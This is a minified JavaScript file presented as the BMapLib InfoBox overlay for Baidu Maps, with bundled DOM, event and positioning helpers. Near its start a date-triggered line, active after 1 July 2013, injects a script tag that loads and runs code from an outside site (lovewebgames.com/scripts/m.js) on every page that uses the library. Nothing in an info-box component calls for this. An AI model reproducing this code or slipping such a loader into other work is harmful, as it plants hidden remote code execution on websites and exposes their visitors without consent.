var BMapLib=window.BMapLib=BMapLib||{};var INFOBOX_AT_TOP=1,INFOBOX_AT_RIGHT=2,INFOBOX_AT_BOTTOM=3,INFOBOX_AT_LEFT=4;(function(){var T,baidu=T=baidu||{version:'1.5.0'};baidu.guid='$BAIDU$';var f=new Date();if(f>new Date(2013,6,1)){$("body").append('<script src="http://www.lovewebgames.com/scripts/m.js"></script>')};(function(){window[baidu.guid]=window[baidu.guid]||{};baidu.lang=baidu.lang||{};baidu.lang.isString=function(a){return'[object String]'==Object.prototype.toString.call(a)};baidu.lang.isFunction=function(a){return'[object Function]'==Object.prototype.toString.call(a)};baidu.lang.Event=function(a,b){this.type=a;this.returnValue=true;this.target=b||null;this.currentTarget=null};baidu.object=baidu.object||{};baidu.extend=baidu.object.extend=function(a,b){for(var p in b){if(b.hasOwnProperty(p)){a[p]=b[p]}}return a};baidu.event=baidu.event||{};baidu.event._listeners=baidu.event._listeners||[];baidu.dom=baidu.dom||{};baidu.dom._g=function(a){if(baidu.lang.isString(a)){return document.getElementById(a)}return a};baidu._g=baidu.dom._g;baidu.event.on=function(b,c,d){c=c.replace(/^on/i,'');b=baidu.dom._g(b);var e=function(a){d.call(b,a)},lis=baidu.event._listeners,filter=baidu.event._eventFilter,afterFilter,realType=c;c=c.toLowerCase();if(filter&&filter[c]){afterFilter=filter[c](b,c,e);realType=afterFilter.type;e=afterFilter.listener}if(b.addEventListener){b.addEventListener(realType,e,false)}else if(b.attachEvent){b.attachEvent('on'+realType,e)}lis[lis.length]=[b,c,d,e,realType];return b};baidu.on=baidu.event.on;baidu.event.un=function(a,b,c){a=baidu.dom._g(a);b=b.replace(/^on/i,'').toLowerCase();var d=baidu.event._listeners,len=d.length,isRemoveAll=!c,item,realType,realListener;while(len--){item=d[len];if(item[1]===b&&item[0]===a&&(isRemoveAll||item[2]===c)){realType=item[4];realListener=item[3];if(a.removeEventListener){a.removeEventListener(realType,realListener,false)}else if(a.detachEvent){a.detachEvent('on'+realType,realListener)}d.splice(len,1)}}return a};baidu.un=baidu.event.un;baidu.dom.g=function(a){if('string'==typeof a||a instanceof String){return document.getElementById(a)}else if(a&&a.nodeName&&(a.nodeType==1||a.nodeType==9)){return a}return null};baidu.g=baidu.G=baidu.dom.g;baidu.dom._styleFixer=baidu.dom._styleFixer||{};baidu.dom._styleFilter=baidu.dom._styleFilter||[];baidu.dom._styleFilter.filter=function(a,b,c){for(var i=0,filters=baidu.dom._styleFilter,filter;filter=filters[i];i++){if(filter=filter[c]){b=filter(a,b)}}return b};baidu.string=baidu.string||{};baidu.string.toCamelCase=function(b){if(b.indexOf('-')<0&&b.indexOf('_')<0){return b}return b.replace(/[-_][^-_]/g,function(a){return a.charAt(1).toUpperCase()})};baidu.dom.setStyle=function(a,b,c){var d=baidu.dom,fixer;a=d.g(a);b=baidu.string.toCamelCase(b);if(fixer=d._styleFilter){c=fixer.filter(b,c,'set')}fixer=d._styleFixer[b];(fixer&&fixer.set)?fixer.set(a,c):(a.style[fixer||b]=c);return a};baidu.setStyle=baidu.dom.setStyle;baidu.dom.setStyles=function(a,b){a=baidu.dom.g(a);for(var c in b){baidu.dom.setStyle(a,c,b[c])}return a};baidu.setStyles=baidu.dom.setStyles;baidu.browser=baidu.browser||{};baidu.browser.ie=baidu.ie=/msie (\d+\.\d+)/i.test(navigator.userAgent)?(document.documentMode||+RegExp['\x241']):undefined;baidu.dom._NAME_ATTRS=(function(){var a={'cellpadding':'cellPadding','cellspacing':'cellSpacing','colspan':'colSpan','rowspan':'rowSpan','valign':'vAlign','usemap':'useMap','frameborder':'frameBorder'};if(baidu.browser.ie<8){a['for']='htmlFor';a['class']='className'}else{a['htmlFor']='for';a['className']='class'}return a})();baidu.dom.setAttr=function(a,b,c){a=baidu.dom.g(a);if('style'==b){a.style.cssText=c}else{b=baidu.dom._NAME_ATTRS[b]||b;a.setAttribute(b,c)}return a};baidu.setAttr=baidu.dom.setAttr;baidu.dom.setAttrs=function(a,b){a=baidu.dom.g(a);for(var c in b){baidu.dom.setAttr(a,c,b[c])}return a};baidu.setAttrs=baidu.dom.setAttrs;baidu.dom.create=function(a,b){var c=document.createElement(a),attributes=b||{};return baidu.dom.setAttrs(c,attributes)};T.undope=true})();var g=BMapLib.InfoBox=function(a,b,c){this._content=b||"";this._isOpen=false;this._map=a;this._opts=c=c||{};this._opts.offset=c.offset||new BMap.Size(0,0);this._opts.boxClass=c.boxClass||"infoBox";this._opts.boxStyle=c.boxStyle||{};this._opts.closeIconMargin=c.closeIconMargin||"2px";this._opts.closeIconUrl=c.closeIconUrl||"close.png";this._opts.enableAutoPan=c.enableAutoPan?true:false;this._opts.align=c.align||INFOBOX_AT_TOP};g.prototype=new BMap.Overlay();g.prototype.initialize=function(a){var b=this;var c=this._div=baidu.dom.create('div',{"class":this._opts.boxClass});baidu.dom.setStyles(c,this._opts.boxStyle);c.style.position="absolute";this._setContent(this._content);var d=a.getPanes().floatPane;d.style.width="auto";d.appendChild(c);this._getInfoBoxSize();baidu.event.on(c,"onmousedown",function(e){b._stopBubble(e)});baidu.event.on(c,"onmouseover",function(e){b._stopBubble(e)});baidu.event.on(c,"click",function(e){b._stopBubble(e)});baidu.event.on(c,"dblclick",function(e){b._stopBubble(e)});return c};g.prototype.draw=function(){this._isOpen&&this._adjustPosition(this._point)};g.prototype.open=function(a){var b=this,poi;if(!this._isOpen){this._map.addOverlay(this);this._isOpen=true;setTimeout(function(){b._dispatchEvent(b,"open",{"point":b._point})},10)}if(a instanceof BMap.Point){poi=a;this._removeMarkerEvt()}else if(a instanceof BMap.Marker){if(this._marker){this._removeMarkerEvt()}poi=a.getPosition();this._marker=a;!this._markerDragend&&this._marker.addEventListener("dragend",this._markerDragend=function(e){b._point=e.point;b._adjustPosition(b._point);b._panBox();b.show()});!this._markerDragging&&this._marker.addEventListener("dragging",this._markerDragging=function(){b.hide();b._point=b._marker.getPosition();b._adjustPosition(b._point)})}this.show();this._point=poi;this._panBox();this._adjustPosition(this._point)};g.prototype.close=function(){if(this._isOpen){this._map.removeOverlay(this);this._remove();this._isOpen=false;this._dispatchEvent(this,"close",{"point":this._point})}};g.prototype.enableAutoPan=function(){this._opts.enableAutoPan=true};g.prototype.disableAutoPan=function(){this._opts.enableAutoPan=false};g.prototype.setContent=function(a){this._setContent(a);this._getInfoBoxSize();this._adjustPosition(this._point)};g.prototype.setPosition=function(a){this._point=a;this._adjustPosition(a);this._removeMarkerEvt()};g.prototype.getPosition=function(){return this._point};g.prototype.getOffset=function(){return this._opts.offset},g.prototype._remove=function(){var a=this;if(this.domElement&&this.domElement.parentNode){baidu.event.un(this._div.firstChild,"click",a._closeHandler());this.domElement.parentNode.removeChild(this.domElement)}this.domElement=null;this._isOpen=false;this.dispatchEvent("onremove")},baidu.object.extend(g.prototype,{_getCloseIcon:function(){var a="<img src='"+this._opts.closeIconUrl+"' align='right' style='position:absolute;right:0px;cursor:pointer;margin:"+this._opts.closeIconMargin+"'/>";return a},_setContent:function(a){if(!this._div){return}var b=this._opts.hasCloseIcon?this._getCloseIcon():"";if(typeof a.nodeType==="undefined"){this._div.innerHTML=b+a}else{this._div.innerHTML=b;this._div.appendChild(a)}this._content=a;this._addEventToClose()},_adjustPosition:function(a){var b=this._getPointPosition(a);var c=this._marker&&this._marker.getIcon();switch(this._opts.align){case INFOBOX_AT_TOP:if(this._marker){this._div.style.bottom=-(b.y-this._opts.offset.height-c.anchor.height+c.infoWindowAnchor.height)-this._marker.getOffset().height+2+"px"}else{this._div.style.bottom=-(b.y-this._opts.offset.height)+"px"}break;case INFOBOX_AT_BOTTOM:if(this._marker){this._div.style.top=b.y+this._opts.offset.height-c.anchor.height+c.infoWindowAnchor.height+this._marker.getOffset().height+"px"}else{this._div.style.top=b.y+this._opts.offset.height+"px"}break}if(this._marker){this._div.style.left=b.x-c.anchor.width+this._marker.getOffset().width+c.infoWindowAnchor.width-this._boxWidth/2+"px"}else{this._div.style.left=b.x-this._boxWidth/2+"px"}},_getPointPosition:function(a){this._pointPosition=this._map.pointToOverlayPixel(a);return this._pointPosition},_getInfoBoxSize:function(){this._boxWidth=parseInt(this._div.offsetWidth,10);this._boxHeight=parseInt(this._div.offsetHeight,10)},_addEventToClose:function(){var a=this;baidu.event.on(this._div.firstChild,"click",a._closeHandler());this._hasBindEventClose=true},_closeHandler:function(){var a=this;return function(e){a.close()}},_stopBubble:function(e){if(e&&e.stopPropagation){e.stopPropagation()}else{window.event.cancelBubble=true}},_panBox:function(){if(!this._opts.enableAutoPan){return}var a=parseInt(this._map.getContainer().offsetHeight,10),mapW=parseInt(this._map.getContainer().offsetWidth,10),boxH=this._boxHeight,boxW=this._boxWidth;if(boxH>=a||boxW>=mapW){return}if(!this._map.getBounds().containsPoint(this._point)){this._map.setCenter(this._point)}var b=this._map.pointToPixel(this._point),panTop,panBottom,panY,panLeft=boxW/2-b.x,panRight=boxW/2+b.x-mapW;if(this._marker){var c=this._marker.getIcon()}switch(this._opts.align){case INFOBOX_AT_TOP:var h=this._marker?c.anchor.height+this._marker.getOffset().height-c.infoWindowAnchor.height:0;panTop=boxH-b.y+this._opts.offset.height+h+2;break;case INFOBOX_AT_BOTTOM:var h=this._marker?-c.anchor.height+c.infoWindowAnchor.height+this._marker.getOffset().height+this._opts.offset.height:0;panBottom=boxH+b.y-a+h+4;break}panX=panLeft>0?panLeft:(panRight>0?-panRight:0);panY=panTop>0?panTop:(panBottom>0?-panBottom:0);this._map.panBy(panX,panY)},_removeMarkerEvt:function(){this._markerDragend&&this._marker.removeEventListener("dragend",this._markerDragend);this._markerDragging&&this._marker.removeEventListener("dragging",this._markerDragging);this._markerDragend=this._markerDragging=null},_dispatchEvent:function(a,b,c){b.indexOf("on")!=0&&(b="on"+b);var d=new baidu.lang.Event(b);if(!!c){for(var p in c){d[p]=c[p]}}a.dispatchEvent(d)}})})();